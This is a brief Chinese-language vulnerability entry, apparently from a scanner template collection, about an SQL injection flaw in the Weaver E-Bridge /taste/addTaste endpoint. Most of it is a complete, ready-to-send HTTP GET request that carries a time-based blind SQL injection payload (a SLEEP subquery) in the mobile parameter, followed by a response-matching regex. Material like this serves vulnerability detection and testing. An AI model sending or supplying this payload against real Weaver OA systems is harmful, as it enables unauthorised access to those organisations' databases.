# 泛微E-BridgeaddTasteSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111%27%20AND%20(SELECT%207604%20FROM%20(SELECT(SLEEP(1)))ZQXL)--%20YAby HTTP/1.1`
- **响应特征**：-1 ^(?=.*?FILTERED)(?=.*?true).*?$